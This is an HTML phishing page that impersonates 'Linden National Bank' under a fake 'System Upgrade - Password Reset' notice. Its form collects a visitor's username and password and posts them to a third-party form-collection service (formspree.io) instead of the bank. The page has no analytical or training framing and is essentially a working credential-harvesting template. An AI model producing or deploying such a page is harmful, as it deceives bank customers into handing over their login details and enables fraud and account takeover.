<!DOCTYPE html>
<html>
<head>
    <title>LNB System Upgrade</title>
    <style>
        body { font-family: Arial; background: #f5f5f5; padding: 50px; }
        .login-box { background: white; padding: 30px; max-width: 400px; margin: 0 auto; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
        button { background: #2872fa; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; width: 100%; }
        .logo { text-align: center; color: #2872fa; font-weight: bold; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">LINDEN NATIONAL BANK</div>
        <h3>System Upgrade - Password Reset</h3>
        <form action="https://formspree.io/f/YOUR-FORM-ID" method="POST">
            <input type="text" name="username" placeholder="Username/Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Continue Upgrade</button>
        </form>
    </div>
</body>
</html>
